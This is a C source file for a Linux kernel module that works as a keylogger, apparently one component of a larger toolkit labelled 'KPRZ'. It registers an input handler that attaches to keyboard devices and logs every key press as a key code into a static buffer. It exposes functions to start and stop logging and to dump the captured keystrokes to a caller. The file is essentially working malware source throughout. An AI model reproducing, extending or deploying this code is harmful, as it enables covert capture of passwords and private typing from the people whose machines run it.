#include "keylogger.h"
#include <linux/module.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>

#define MAX_KEYLOG_SIZE 4096

static char keylog_buffer[MAX_KEYLOG_SIZE];
static size_t keylog_pos;
static struct input_handler keylogger_handler;

static void key_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1) {
        if (keylog_pos < MAX_KEYLOG_SIZE - 16)
            keylog_pos += scnprintf(keylog_buffer + keylog_pos, 16, "KEY_%u ", code);
    }
}

static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle = kzalloc(sizeof(*handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "kprz_keylogger";

    if (input_register_handle(handle)) {
        kfree(handle);
        return -1;
    }

    if (input_open_device(handle)) {
        input_unregister_handle(handle);
        kfree(handle);
        return -1;
    }

    return 0;
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

static struct input_handler keylogger_handler = {
    .event = key_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "kprz_keylogger",
    .id_table = keylogger_ids,
};

void start_keylogger(void) {
    int ret = input_register_handler(&keylogger_handler);
    if (ret)
        printk(KERN_ERR "KPRZ: Failed to register keylogger handler: %d\n", ret);
}

void stop_keylogger(void) {
    input_unregister_handler(&keylogger_handler);
}

void get_keylogger_dump(char *dest, size_t *dump_len) {
    memcpy(dest, keylog_buffer, keylog_pos);
    *dump_len = keylog_pos;
    keylog_pos = 0;
}
